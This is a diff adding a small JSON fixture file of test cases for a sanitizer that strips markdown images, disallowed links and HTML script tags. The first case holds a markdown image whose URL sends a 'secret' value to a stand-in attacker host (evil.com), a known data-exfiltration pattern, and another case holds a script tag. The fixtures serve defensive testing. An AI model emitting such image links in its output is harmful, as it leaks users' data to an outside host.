@@ -1,0 +1,32 @@
+[
+  {
+    "name": "strip_image",
+    "input": "see ![logo](https://evil.com/t.png?d=secret) ok",
+    "allow_hosts": [],
+    "expected": "see  ok"
+  },
+  {
+    "name": "disallowed_link_to_text",
+    "input": "go [here](https://evil.com/p) now",
+    "allow_hosts": [],
+    "expected": "go here now"
+  },
+  {
+    "name": "allowlisted_link_kept",
+    "input": "docs [d](https://good.com/p)",
+    "allow_hosts": ["good.com"],
+    "expected": "docs [d](https://good.com/p)"
+  },
+  {
+    "name": "strip_script_and_tags",
+    "input": "<script>x()</script>hi<b>!</b>",
+    "allow_hosts": [],
+    "expected": "hi!"
+  },
+  {
+    "name": "clean",
+    "input": "just plain text",
+    "allow_hosts": [],
+    "expected": "just plain text"
+  }
+]
